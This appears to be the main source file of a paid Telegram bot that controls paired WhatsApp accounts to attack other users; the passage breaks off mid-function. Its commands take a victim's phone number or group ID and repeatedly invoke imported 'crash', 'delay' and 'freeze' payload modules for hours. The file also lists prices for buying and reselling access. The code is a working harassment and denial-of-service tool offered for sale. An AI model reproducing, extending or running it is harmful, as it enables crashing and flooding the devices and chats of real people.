process.env.NTBA_FIX_350 = 1;
const SY = require('node-telegram-bot-api');
const fs = require('fs');
const path = require('path');
const config = require('./config');
const { default: makeWASocket, useMultiFileAuthState, delay, DisconnectReason, makeCacheableSignalKeyStore } = require('@whiskeysockets/baileys');
const pino = require('pino');

console.clear();

// --- GLOBAL ERROR HANDLING ---
process.on('uncaughtException', (err) => {
    console.error('\x1b[31m[CRITICAL ERROR] Uncaught Exception:\x1b[0m', err);
});
process.on('unhandledRejection', (reason, promise) => {
    console.error('\x1b[31m[CRITICAL ERROR] Unhandled Rejection:\x1b[0m', reason);
});

const LoveDir = './Love';
if (!fs.existsSync(LoveDir)) fs.mkdirSync(LoveDir);

const { spawn } = require('child_process');
const activeBots = {};
const startTime = Date.now();
const LoveLogo = config.logo;
const waSessions = {};
const unauthorized = Buffer.from('8J+aqyBZb3UgYXJlIG5vdCBhdXRob3JpemVkIHRvIHVzZSB0aGlzIGNvbW1hbmQu', 'base64').toString();

// SY Loves Here 🤗❤️‍🩹
const SYLoves = `./SY/S7/`;
const CrashLogic = require(SYLoves + 'crashfinity');
const stickerLogic = require(SYLoves + 'StickerCrash');
const CallLogic = require(SYLoves + 'CallCrash');
const XLogic = require(SYLoves + 'Xdelay');
const IosLogic = require(SYLoves + 'IosInvisible');
const XgcLogic = require(SYLoves + 'Xgc');
const xbetainvisLogic = require(SYLoves + 'xbetainvis');
const testlogic = require(SYLoves + 'test');
// ADDED NEW MODULES
const crashjamLogic = require(SYLoves + 'crashjam');
const killsystemLogic = require(SYLoves + 'killsystem');
const gcFrzLogic = require(SYLoves + 'gcFrz');

const colors = {
    reset: "\x1b[0m", gray: "\x1b[90m", blue: "\x1b[34m", green: "\x1b[32m",
    red: "\x1b[31m", magenta: "\x1b[35m", cyan: "\x1b[36m", yellow: "\x1b[33m"
};

function getRuntime() {
    const now = Date.now();
    const diff = now - startTime;
    const days = Math.floor(diff / (1000 * 60 * 60 * 24));
    const hours = Math.floor((diff / (1000 * 60 * 60)) % 24);
    const minutes = Math.floor((diff / (1000 * 60)) % 60);
    return `${days}d ${hours}h ${minutes}m`;
}

function log(type, user, message) {
    const time = new Date().toLocaleTimeString();
    const timestamp = `${colors.gray}[${time}]${colors.reset}`;
    let typeTag = "";
    if (type === 'info') typeTag = `${colors.blue}INFO${colors.reset}`;
    if (type === 'success') typeTag = `${colors.green}SUCCESS${colors.reset}`;
    if (type === 'error') typeTag = `${colors.red}ERROR${colors.reset}`;
    if (type === 'command') typeTag = `${colors.magenta}CMD${colors.reset}`;
    const userTag = user ? `${colors.cyan}${user}${colors.reset}` : "SYSTEM";
    console.log(`${timestamp} | ${typeTag} | ${userTag} | ${message}`);
}

const getDB = () => {
    const dbPath = path.join(LoveDir, 'data.json');
    if (!fs.existsSync(dbPath)) return { tokens: [], premium: [], resellers: [] };
    try {
        const content = fs.readFileSync(dbPath);
        const parsed = JSON.parse(content);
        if (Array.isArray(parsed)) return { tokens: parsed, premium: [], resellers: [] };
        return {
            state: typeof parsed.state === 'number' ? parsed.state : 0,
            tokens: parsed.tokens || [],
            premium: parsed.premium || [],
            resellers: parsed.resellers || []
        };
    } catch (err) {
        log('error', null, 'Database Read Error: ' + err.message);
        return { tokens: [], premium: [], resellers: [] };
    }
};

const saveDB = (data) => {
    try {
        fs.writeFileSync(path.join(LoveDir, 'data.json'), JSON.stringify(data, null, 2));
    } catch (err) {
        log('error', null, 'Database Save Error: ' + err.message);
    }
};

function sendSYLove(bot, chatId) {
    bot.sendMessage(
        chatId,
        `🚫 <b>You are not authorized to use this command.</b>\n\n` +
        `📩 Please contact the developer to buy: ${config.S7}\n\n` +
        `💰 <b>Price/Cost:</b>\n` +
        `✅ <b>Permanent Access</b>: 15$\n` +
        `✅ <b>Permanent Resell</b>: 30$\n` +
        `✅ <b>Script (No Encryption, 100%)</b>: 100$`,
        { parse_mode: 'HTML' }
    );
}

function LoveGlobalState(userId) {
    const db = getDB();
    if (db.state === 0) return true;
    if (
        userId.toString() === config.adminId.toString() ||
        db.resellers.includes(userId.toString()) ||
        db.premium.includes(userId.toString())
    ) {
        return true;
    }
    return false;
}

// --- GLOBAL SESSION POOL ---
function GetSessionForUser(userId, chatId) {
    let db = getDB();
    const isPremium = (
        userId.toString() === config.adminId.toString() ||
        db.resellers.includes(userId.toString()) ||
        db.premium.includes(userId.toString())
    );

    let eligibleSessions = [];

    if (isPremium) {
        Object.values(waSessions).forEach(sessions => {
            if (Array.isArray(sessions)) {
                sessions.forEach(s => eligibleSessions.push(s));
            }
        });
        if (eligibleSessions.length === 0) {
            return { error: '❌ No numbers connected in the system globally.' };
        }
        return eligibleSessions[Math.floor(Math.random() * eligibleSessions.length)];
    } else {
        if (!waSessions[chatId] || waSessions[chatId].length === 0) {
            return { error: '❌ No Number connected please use /reqpair to connect' };
        }
        return waSessions[chatId][Math.floor(Math.random() * waSessions[chatId].length)];
    }
}

// --- WhatsApp Connection Functions ---
async function StartLovingSY(chatId, number, S7) {
    const authPath = `./Love/auth/${chatId}/${number}`;
    const isNewLogin = !fs.existsSync(path.join(authPath, 'creds.json'));

    if (!fs.existsSync(authPath)) {
        fs.mkdirSync(authPath, { recursive: true });
    }

    const { state, saveCreds } = await useMultiFileAuthState(authPath);

    const SYxS7 = makeWASocket({
        logger: pino({ level: 'silent' }),
        printQRInTerminal: false,
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "fatal" }).child({ level: "fatal" })),
        },
        browser: ['Mac OS', 'Safari', '10.15.7'],
        markOnlineOnConnect: true
    });

    if (!SYxS7.authState.creds.registered) {
        await delay(1500);
        try {
            const code = await SYxS7.requestPairingCode(number, `PHONIK2D`);
            S7.sendMessage(chatId, `╭──────「 𝗣𝗮𝗶𝗿𝗶𝗻𝗴 𝗖𝗼𝗱𝗲 」──────╮\n│➻ Nᴜᴍʙᴇʀ : ${number}\n│➻ Pᴀɪʀɪɴɢ ᴄᴏᴅᴇ : <code>${code?.match(/.{1,4}/g)?.join("-") || code}</code>\n╰───────────────────────╯`, { parse_mode: 'HTML' });
        } catch (err) {
            log('error', 'WhatsApp', `Error requesting code: ${err.message}`);
        }
    }

    SYxS7.ev.on('creds.update', saveCreds);

    SYxS7.ev.on("connection.update", async (update) => {
        const { connection, lastDisconnect } = update;

        if (connection === 'connecting') {
            log('info', 'WhatsApp', `Connecting: ${number}`);
        }

        if (connection === "open") {
            log('success', 'WhatsApp', `Connected: ${number}`);
            if (!waSessions[chatId]) waSessions[chatId] = [];
            waSessions[chatId].push({ sock: SYxS7, num: number });
            if (isNewLogin) {
                await S7.sendMessage(chatId, `✅ <b>WhatsApp Connected!</b>\nNumber: ${number}.`, { parse_mode: 'HTML' }).catch(() => {});
            }
        }
        if (connection === "close") {
            if (waSessions[chatId]) {
                waSessions[chatId] = waSessions[chatId].filter(s => s.num !== number);
            }

            let reason = lastDisconnect?.error?.output?.statusCode;
            log('error', 'WhatsApp', `Connection closed for ${number}. Reason: ${reason}`);
            if (reason === DisconnectReason.restartRequired || reason === DisconnectReason.connectionLost) {
                log('info', 'WhatsApp', `Restarting/Reconnecting session for ${number}...`);
                StartLovingSY(chatId, number, S7);
            } else if (reason === DisconnectReason.loggedOut || reason === 401) {
                log('error', 'WhatsApp', `Session for ${number} is permanently LOGGED OUT.`);
                await S7.sendMessage(chatId, `❌ <b>WhatsApp Logged Out</b>\nNumber: ${number}\nSession has been terminated. Please use /reqpair again.`, { parse_mode: 'HTML' }).catch(() => {});
                const SYPaTH = `./Love/auth/${chatId}/${number}`;
                if (fs.existsSync(SYPaTH)) fs.rmSync(SYPaTH, { recursive: true, force: true });
            } else if (reason === DisconnectReason.timedOut) {
                log('error', 'WhatsApp', `Timed out for ${number}. Reconnecting...`);
                StartLovingSY(chatId, number, S7);
            } else {
                await S7.sendMessage(chatId, `⚠️ <b>Connection Closed</b>\nNumber: ${number}\nReason: ${reason}`, { parse_mode: 'HTML' }).catch(() => {});
            }
        }
    });
}

async function AutoLovingWithSY(S7) {
    const SYBase = './Love/auth';
    if (!fs.existsSync(SYBase)) return;
    try {
        const chatIds = fs.readdirSync(SYBase);
        for (const chatId of chatIds) {
            const chatPath = path.join(SYBase, chatId);
            if (!fs.statSync(chatPath).isDirectory()) continue;
            const numbers = fs.readdirSync(chatPath);
            for (const number of numbers) {
                const sessionPath = path.join(chatPath, number);
                if (fs.existsSync(path.join(sessionPath, 'creds.json'))) {
                    log('info', 'SYSTEM', `Found saved session for ${number}, Reconnecting...`);
                    await new Promise(resolve => setTimeout(resolve, 3000));
                    StartLovingSY(chatId, number, S7);
                }
            }
        }
    } catch (err) {
        log('error', 'SYSTEM', `AutoReconnect Error: ${err.message}`);
    }
}

async function S7Naverdead(token, errorMsg) {
    let db = getDB();
    const tokenObj = db.tokens.find(t => t.token === token);
    if (!tokenObj) return;

    const ownerId = tokenObj.owner;
    try {
        const mainBot = activeBots[config.mainToken];
        if (mainBot) {
            await mainBot.sendMessage(
                ownerId,
                `❌ <b>Token Error</b>\n\n` +
                `Your bot token is not working.\n` +
                `Reason: <code>${errorMsg}</code>\n\n` +
                `Token has been removed automatically.`,
                { parse_mode: 'HTML' }
            );
        }
    } catch (e) {
        log('error', 'SYSTEM', 'Failed to notify token owner');
    }

    db.tokens = db.tokens.filter(t => t.token !== token);
    saveDB(db);

    if (activeBots[token]) {
        try {
            await activeBots[token].stopPolling();
        } catch {}
        delete activeBots[token];
    }

    log('info', 'SYSTEM', `Dead token auto-removed: ${token.substring(0, 10)}...`);
}

function GetSYLoVe(love) {
    const db = getDB();
    if (love.toString() === config.adminId.toString()) return 'Owner';
    if (db.resellers.includes(love.toString())) return 'Reseller';
    if (db.premium.includes(love.toString())) return 'Premium';
    return 'Free User';
}

function MainSYLoVe(name, uptime, love) {
    const status = GetSYLoVe(love);
    return `┌──────┤ ${config.bot} ├──────┐\n│➻ Name: ${name}\n│➻ Status: ${status}\n│➻ Online: ${uptime}\n└──────────────────────┘`;
}

function BvgSYLoVe(cleanTarget) {
    return `┏━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━━┓\n┃ ᴘʟᴇᴀsᴇ ᴡᴀɪᴛ...\n┃ ᴛʜᴇ ʙᴏᴛ ɪs ᴄᴜʀʀᴇɴᴛʟʏ sᴇɴᴅɪɴɢ ʙᴜɢ \n┃ Tᴀʀɢᴇᴛ : ${cleanTarget}\n┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`;
}

// ==================== START BOT ====================
function startSYloveBot(token) {
    try {
        const S7 = new SY(token, { polling: true });
        S7.getMe().then((botInfo) => {
            activeBots[token] = S7;
            log('success', null, `Bot Started: ${botInfo.first_name} (@${botInfo.username})`);
            if (token === config.mainToken) {
                log('info', 'SYSTEM', 'Checking for saved WhatsApp sessions...');
                AutoLovingWithSY(S7);
            }
        }).catch(async (err) => {
            log('error', null, `Failed to connect token: ${token.substring(0, 10)}... Error: ${err.message}`);
            if (err.message.includes('404') || err.message.includes('401') || err.message.includes('Unauthorized')) {
                await S7Naverdead(token, err.message);
            }
        });

        S7.on('polling_error', (error) => {
            if (error.code !== 'EFATAL') return;
            log('error', 'POLLING', error.message);
        });

        function SYLoVe(commands, callback) {
            if (!Array.isArray(commands)) commands = [commands];
            S7.on('message', (msg) => {
                if (!msg.text) return;
                const cmd = msg.text.trim().split(' ')[0].slice(1);
                if (commands.includes(cmd)) {
                    try {
                        const name = msg.from.first_name || msg.from.username || "Unknown";
                        log('command', name, msg.text);
                        callback(msg);
                    } catch (err) {
                        log('error', 'COMMAND_EXEC', err.message);
                        S7.sendMessage(msg.chat.id, 'An internal error occurred.');
                    }
                }
            });
        }

        // ==================== COMMANDS ====================

        // --- Start / Menu ---
        SYLoVe(['start', 'menu'], (msg) => {
            const chatId = msg.chat.id;
            const name = msg.from.username ? `@${msg.from.username}` : msg.from.first_name;
            const uptime = getRuntime();

            const userFile = path.join(LoveDir, 'user.json');
            let users = [];
            if (fs.existsSync(userFile)) users = JSON.parse(fs.readFileSync(userFile));

            const userExists = users.find(u => u.id === chatId);
            if (!userExists) {
                users.push({ id: chatId, name: name, date: new Date().toLocaleString() });
                fs.writeFileSync(userFile, JSON.stringify(users, null, 2));
            }
            const love = msg.from.id.toString();

            const captionText = MainSYLoVe(name, uptime, love) + `
┌──────┤ Press Button Menu ├──────┐
└────────────────────────┘`;

            const menuButtons = {
                reply_markup: {
                    inline_keyboard: [
                        [{ text: 'I|  Bug Menu', callback_data: 'bug_menu' }, { text: 'I|  Misc Menu', callback_data: 'misc_menu' }],
                        [{ text: 'I|  Channel ↗', url: `${config.channel}` }],
                        [{ text: 'I|  Group ↗', url: `${config.group}` }]
                    ]
                }
            };

            S7.sendPhoto(chatId, LoveLogo, {
                caption: captionText,
                ...menuButtons
            }).catch(() => {
                S7.sendMessage(chatId, captionText, menuButtons);
            });
        });

        // ==================== CALLBACK QUERY HANDLER (UPDATED WITH NEW COMMANDS) ====================
        S7.on('callback_query', async (query) => {
            const chatId = query.message.chat.id;
            const messageId = query.message.message_id;
            const data = query.data;
            const name = query.from.username ? `@${query.from.username}` : query.from.first_name;
            const uptime = getRuntime();
            const userId = query.from.id.toString();

            if (!LoveGlobalState(userId)) {
                await S7.answerCallbackQuery(query.id, { text: '⛔ You are not authorized!', show_alert: true });
                return sendSYLove(S7, chatId);
            }

            // Main Menu
            if (data === 'main_menu') {
                const mainText = MainSYLoVe(name, uptime, userId) + `
┌──────┤ Press Button Menu ├──────┐
└────────────────────────┘`;

                await S7.editMessageCaption(mainText, {
                    chat_id: chatId,
                    message_id: messageId,
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: 'I|  Bug Menu', callback_data: 'bug_menu' }, { text: 'I|  Misc Menu', callback_data: 'misc_menu' }],
                            [{ text: 'I|  Channel ↗', url: `${config.channel}` }],
                            [{ text: 'I|  Group ↗', url: `${config.group}` }]
                        ]
                    }
                });
            }

            // Bug Menu
            else if (data === 'bug_menu') {
                const bugText = MainSYLoVe(name, uptime, userId) + `
┌──────┤ BUG MENU ├──────┐
│ Select your platform
└──────────────────────┘`;

                await S7.editMessageCaption(bugText, {
                    chat_id: chatId,
                    message_id: messageId,
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: 'I| 𝖠𝗇𝖽𝗋𝗈𝗂𝖽 𝖡𝗎𝗀𝗌', callback_data: 'android_menu' }],
                            [{ text: 'I| 𝖨𝗈𝗌 𝖡𝗎𝗀𝗌', callback_data: 'ios_menu' }],
                            [{ text: 'I| 𝖦𝗋𝗈𝗎𝗉 𝖡𝗎𝗀𝗌', callback_data: 'group_menu' }],
                            [{ text: 'I| 𝖡𝖺𝖼𝗄 𝗍𝗈 𝖬𝖺𝗂𝗇', callback_data: 'main_menu' }]
                        ]
                    }
                });
            }

            // Android Menu - UPDATED WITH NEW COMMANDS
            else if (data === 'android_menu') {
                const androidText = MainSYLoVe(name, uptime, userId) + `
┌──────┤ 𝖠𝖭𝖣𝖱𝖮𝖨𝖣 𝖡𝖴𝖦𝖲 ├──────┐
│➻ /crashjam [num] [hours]
│➻ /trashsystem [num] [hours]
│➻ /crashdroid [num] [hours]
│➻ /killsystem [num] [hours]
│➻ /forceblock [num] [amount]
│➻ /xbetainvis [num]
│➻ /delaymaker [num] [hours]
│➻ /delayxceed [num] [hours]
│➻ /absolutedelay [num] [hours]
│➻ /xdelayinvis [num] [hours]
│➻ /nullfinity [num] [hours]
│➻ /crashfinity [num]
└──────────────────────┘`;

                await S7.editMessageCaption(androidText, {
                    chat_id: chatId,
                    message_id: messageId,
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: '◀️ 𝖡𝖺𝖼𝗄 𝗍𝗈 𝖡𝗎𝗀 𝖬𝖾𝗇𝗎', callback_data: 'bug_menu' }]
                        ]
                    }
                });
            }

            // iOS Menu
            else if (data === 'ios_menu') {
                const iosText = MainSYLoVe(name, uptime, userId) + `
┌──────┤ 𝖨𝖮𝖲 𝖡𝖴𝖦𝖲 ├──────┐
│➻ /hidenseek [num] [hours]
│➻ /iosinvisible [num] [hours]
│➻ /iosvisible [num] [hours]
└──────────────────────┘`;

                await S7.editMessageCaption(iosText, {
                    chat_id: chatId,
                    message_id: messageId,
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: '◀️ 𝖡𝖺𝖼𝗄 𝗍𝗈 𝖡𝗎𝗀 𝖬𝖾𝗇𝗎', callback_data: 'bug_menu' }]
                        ]
                    }
                });
            }

            // Group Menu - UPDATED WITH NEW COMMANDS
            else if (data === 'group_menu') {
                const groupText = MainSYLoVe(name, uptime, userId) + `
┌──────┤ 𝖦𝖱𝖮𝖴𝖯 𝖡𝖴𝖦𝖲 ├──────┐
│➻ /trashsysgp [group_id] [hours]
│➻ /xgroup [group_id] [hours]
│➻ /killgc [group_id] [hours]
│➻ /groupfriz [group_id] [hours]
│➻ /groupui [group_id] [hours]
│➻ /nullgc [group_id] [hours]
│➻ /groupfinity [group_id] [hours]
│➻ /autoclosegc [group_id] [hours]
│➻ /groupmix [group_id] [hours]
│➻ /forcegroup [group_id] [amount]
│➻ /listgc
│➻ /groupid [link]
└──────────────────────┘`;

                await S7.editMessageCaption(groupText, {
                    chat_id: chatId,
                    message_id: messageId,
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: '◀️ 𝖡𝖺𝖼𝗄 𝗍𝗈 𝖡𝗎𝗀 𝖬𝖾𝗇𝗎', callback_data: 'bug_menu' }]
                        ]
                    }
                });
            }

            // Misc Menu
            else if (data === 'misc_menu') {
                const miscText = MainSYLoVe(name, uptime, userId) + `
┌──────┤ 𝖬𝖨𝖲𝖢 𝖬𝖤𝖭𝖴 ├──────┐
│➻ /reqpair [number]
│➻ /delpair [number]
│➻ /addprem [ID]
│➻ /delprem [ID]
│➻ /addresell [ID]
│➻ /delresell [ID]
│➻ /addtoken [token]
│➻ /deltoken [token]
│➻ /listprem
│➻ /listresell
│➻ /listuser
│➻ /mytoken
│➻ /state [0|1]
│➻ /broadcast [message]
└──────────────────────┘`;

                await S7.editMessageCaption(miscText, {
                    chat_id: chatId,
                    message_id: messageId,
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: '◀️ 𝖡𝖺𝖼𝗄 𝗍𝗈 𝖬𝖺𝗂𝗇', callback_data: 'main_menu' }]
                        ]
                    }
                });
            }

            await S7.answerCallbackQuery(query.id);
        });

        // ==================== EXISTING BUG COMMANDS ====================

        SYLoVe('xbetainvis', async (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            const args = msg.text.split(' ');
            const targetNum = args[1];

            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);

            const session = GetSessionForUser(userId, chatId);
            if (session.error) return S7.sendMessage(chatId, session.error);
            const client = session.sock;

            if (!targetNum) return S7.sendMessage(chatId, `❌ Usage: /xbetainvis +92020065715`);

            const cleanTarget = targetNum.replace(/[^0-9]/g, '');
            const targetJid = `${cleanTarget}@s.whatsapp.net`;

            try {
                const [exists] = await client.onWhatsApp(targetJid);
                if (!exists) return S7.sendMessage(chatId, `❌ This Number isn't on WhatsApp`);

                log('command', msg.from.first_name, `Calling xbetainvis on ${cleanTarget}`);
                await S7.sendPhoto(chatId, LoveLogo, { caption: BvgSYLoVe(cleanTarget), parse_mode: 'HTML' });

                await xbetainvisLogic.xbetainvis(client, targetJid);
            } catch (err) {
                log('error', 'xbetainvis', err.message);
                S7.sendMessage(chatId, `❌ Error: ${err.message}`);
            }
        });

        SYLoVe(['delaymaker', 'absolutedelay', 'forceblock'], async (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            const args = msg.text.split(' ');
            const cmd = args[0].slice(1);

            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);

            const session = GetSessionForUser(userId, chatId);
            if (session.error) return S7.sendMessage(chatId, session.error);
            const client = session.sock;

            if (args.length < 3) {
                return S7.sendMessage(chatId, `❌ Usage: /${cmd} +92020065715 1`);
            }

            const cleanTarget = args[1].replace(/[^0-9]/g, '');
            const targetJid = `${cleanTarget}@s.whatsapp.net`;

            try {
                const [exists] = await client.onWhatsApp(targetJid);
                if (!exists) return S7.sendMessage(chatId, `❌ This Number isn't on WhatsApp`);

                log('command', msg.from.first_name, `Calling ${cmd} on ${cleanTarget}`);
                await S7.sendPhoto(chatId, LoveLogo, { caption: BvgSYLoVe(cleanTarget), parse_mode: 'HTML' });

                const delayFn = ms => new Promise(res => setTimeout(res, ms));

                if (args[2] === 'only') {
                    const count = parseInt(args[3]);
                    if (!count || count <= 0) return S7.sendMessage(chatId, '❌ Invalid count');
                    for (let i = 0; i < count; i++) {
                        await CallLogic.CallCrash(client, targetJid);
                        await delayFn(2000);
                    }
                } else {
                    const hours = parseInt(args[2]);
                    if (!hours || hours <= 0) return S7.sendMessage(chatId, '❌ Invalid time');
                    const endTime = Date.now() + hours * 60 * 60 * 1000;
                    while (Date.now() < endTime) {
                        await CallLogic.CallCrash(client, targetJid);
                        await delayFn(2000);
                    }
                }
            } catch (err) {
                log('error', cmd, err.message);
                S7.sendMessage(chatId, `❌ Error: ${err.message}`);
            }
        });

        SYLoVe('xdelayinvis', async (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            const args = msg.text.split(' ');

            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);

            const session = GetSessionForUser(userId, chatId);
            if (session.error) return S7.sendMessage(chatId, session.error);
            const client = session.sock;

            if (args.length < 3) {
                return S7.sendMessage(chatId, `❌ Usage: /xdelayinvis +92020065715 1`);
            }

            const cleanTarget = args[1].replace(/[^0-9]/g, '');
            const targetJid = `${cleanTarget}@s.whatsapp.net`;

            try {
                const [exists] = await client.onWhatsApp(targetJid);
                if (!exists) return S7.sendMessage(chatId, `❌ This Number isn't on WhatsApp`);

                log('command', msg.from.first_name, `Calling xdelayinvis on ${cleanTarget}`);
                await S7.sendPhoto(chatId, LoveLogo, { caption: BvgSYLoVe(cleanTarget), parse_mode: 'HTML' });

                const delayFn = ms => new Promise(res => setTimeout(res, ms));

                if (args[2] === 'only') {
                    const count = parseInt(args[3]);
                    if (!count || count <= 0) return S7.sendMessage(chatId, '❌ Invalid count');
                    for (let i = 0; i < count; i++) {
                        await XLogic.Xdelay(client, targetJid);
                        await delayFn(500);
                    }
                } else {
                    const hours = parseInt(args[2]);
                    if (!hours || hours <= 0) return S7.sendMessage(chatId, '❌ Invalid time');
                    const endTime = Date.now() + hours * 60 * 60 * 1000;
                    while (Date.now() < endTime) {
                        await XLogic.Xdelay(client, targetJid);
                        await delayFn(500);
                    }
                }
            } catch (err) {
                log('error', 'xdelayinvis', err.message);
                S7.sendMessage(chatId, `❌ Error: ${err.message}`);
            }
        });

        SYLoVe('crashfinity', async (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            const args = msg.text.split(' ');
            const targetNum = args[1];

            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);

            const session = GetSessionForUser(userId, chatId);
            if (session.error) return S7.sendMessage(chatId, session.error);
            const client = session.sock;

            if (!targetNum) return S7.sendMessage(chatId, `❌ Usage: /crashfinity +92020065715`);

            const cleanTarget = targetNum.replace(/[^0-9]/g, '');
            const targetJid = `${cleanTarget}@s.whatsapp.net`;

            try {
                const [exists] = await client.onWhatsApp(targetJid);
                if (!exists) return S7.sendMessage(chatId, `❌ This Number isn't on WhatsApp`);

                log('command', msg.from.first_name, `Calling crashfinity on ${cleanTarget}`);
                await S7.sendPhoto(chatId, LoveLogo, { caption: BvgSYLoVe(cleanTarget), parse_mode: 'HTML' });

                if (typeof CrashLogic.crashfinity === 'function') {
                    await CrashLogic.crashfinity(client, targetJid);
                } else throw new Error('Function not found');
            } catch (err) {
                log('error', 'crashfinity', err.message);
                S7.sendMessage(chatId, `❌ Error: ${err.message}`);
            }
        });

        SYLoVe('crashdroid', async (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            const args = msg.text.split(' ');

            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);

            const session = GetSessionForUser(userId, chatId);
            if (session.error) return S7.sendMessage(chatId, session.error);
            const client = session.sock;

            if (args.length < 3) {
                return S7.sendMessage(chatId, `❌ Usage: /crashdroid +92020065715 1`);
            }

            const cleanTarget = args[1].replace(/[^0-9]/g, '');
            const targetJid = `${cleanTarget}@s.whatsapp.net`;

            try {
                const [exists] = await client.onWhatsApp(targetJid);
                if (!exists) return S7.sendMessage(chatId, `❌ This Number isn't on WhatsApp`);

                log('command', msg.from.first_name, `Calling crashdroid on ${cleanTarget}`);
                await S7.sendPhoto(chatId, LoveLogo, { caption: BvgSYLoVe(cleanTarget), parse_mode: 'HTML' });

                const delayFn = ms => new Promise(res => setTimeout(res, ms));

                if (args[2] === 'only') {
                    const count = parseInt(args[3]);
                    if (!count || count <= 0) return S7.sendMessage(chatId, '❌ Invalid count');
                    for (let i = 0; i < count; i++) {
                        await CallLogic.CallCrash(client, targetJid);
                        await delayFn(2000);
                    }
                } else {
                    const hours = parseInt(args[2]);
                    if (!hours || hours <= 0) return S7.sendMessage(chatId, '❌ Invalid time');
                    const endTime = Date.now() + hours * 60 * 60 * 1000;
                    while (Date.now() < endTime) {
                        await CallLogic.CallCrash(client, targetJid);
                        await delayFn(2000);
                    }
                }
            } catch (err) {
                log('error', 'crashdroid', err.message);
                S7.sendMessage(chatId, `❌ Error: ${err.message}`);
            }
        });

        SYLoVe('killsystem', async (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            const args = msg.text.split(' ');
            const targetNum = args[1];

            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);

            const session = GetSessionForUser(userId, chatId);
            if (session.error) return S7.sendMessage(chatId, session.error);
            const client = session.sock;

            if (!targetNum) return S7.sendMessage(chatId, `❌ Usage: /killsystem +92020065715`);

            const cleanTarget = targetNum.replace(/[^0-9]/g, '');
            const targetJid = `${cleanTarget}@s.whatsapp.net`;

            try {
                const [exists] = await client.onWhatsApp(targetJid);
                if (!exists) return S7.sendMessage(chatId, `❌ This Number isn't on WhatsApp`);

                log('command', msg.from.first_name, `Calling killsystem on ${cleanTarget}`);
                await S7.sendPhoto(chatId, LoveLogo, { caption: BvgSYLoVe(cleanTarget), parse_mode: 'HTML' });

                await killsystemLogic.killsystem(client, targetJid);
            } catch (err) {
                log('error', 'killsystem', err.message);
                S7.sendMessage(chatId, `❌ Error: ${err.message}`);
            }
        });

        SYLoVe('delayxceed', async (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            const args = msg.text.split(' ');

            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);

            const session = GetSessionForUser(userId, chatId);
            if (session.error) return S7.sendMessage(chatId, session.error);
            const client = session.sock;

            if (args.length < 3) {
                return S7.sendMessage(chatId, `❌ Usage: /delayxceed +92020065715 1`);
            }

            const cleanTarget = args[1].replace(/[^0-9]/g, '');
            const targetJid = `${cleanTarget}@s.whatsapp.net`;

            try {
                const [exists] = await client.onWhatsApp(targetJid);
                if (!exists) return S7.sendMessage(chatId, `❌ This Number isn't on WhatsApp`);

                log('command', msg.from.first_name, `Calling delayxceed on ${cleanTarget}`);
                await S7.sendPhoto(chatId, LoveLogo, { caption: BvgSYLoVe(cleanTarget), parse_mode: 'HTML' });

                const delayFn = ms => new Promise(res => setTimeout(res, ms));

                if (args[2] === 'only') {
                    const count = parseInt(args[3]);
                    if (!count || count <= 0) return S7.sendMessage(chatId, '❌ Invalid count');
                    for (let i = 0; i < count; i++) {
                        await XLogic.Xdelay(client, targetJid);
                        await delayFn(500);
                    }
                } else {
                    const hours = parseInt(args[2]);
                    if (!hours || hours <= 0) return S7.sendMessage(chatId, '❌ Invalid time');
                    const endTime = Date.now() + hours * 60 * 60 * 1000;
                    while (Date.now() < endTime) {
                        await XLogic.Xdelay(client, targetJid);
                        await delayFn(500);
                    }
                }
            } catch (err) {
                log('error', 'delayxceed', err.message);
                S7.sendMessage(chatId, `❌ Error: ${err.message}`);
            }
        });

        SYLoVe('nullfinity', async (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            const args = msg.text.split(' ');
            const targetNum = args[1];

            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);

            const session = GetSessionForUser(userId, chatId);
            if (session.error) return S7.sendMessage(chatId, session.error);
            const client = session.sock;

            if (!targetNum) return S7.sendMessage(chatId, `❌ Usage: /nullfinity +92020065715`);

            const cleanTarget = targetNum.replace(/[^0-9]/g, '');
            const targetJid = `${cleanTarget}@s.whatsapp.net`;

            try {
                const [exists] = await client.onWhatsApp(targetJid);
                if (!exists) return S7.sendMessage(chatId, `❌ This Number isn't on WhatsApp`);

                log('command', msg.from.first_name, `Calling nullfinity on ${cleanTarget}`);
                await S7.sendPhoto(chatId, LoveLogo, { caption: BvgSYLoVe(cleanTarget), parse_mode: 'HTML' });

                await XLogic.Xdelay(client, targetJid);
                await CrashLogic.crashfinity(client, targetJid);
            } catch (err) {
                log('error', 'nullfinity', err.message);
                S7.sendMessage(chatId, `❌ Error: ${err.message}`);
            }
        });

        // ==================== NEW ANDROID BUG COMMANDS FROM YOUR SCRIPT ====================

        SYLoVe(['crashjam', 'trashsystem'], async (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            const args = msg.text.split(' ');
            const s7CM = args[0].slice(1);

            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);

            const session = GetSessionForUser(userId, chatId);
            if (session.error) return S7.sendMessage(chatId, session.error);
            const client = session.sock;

            if (args.length < 3) {
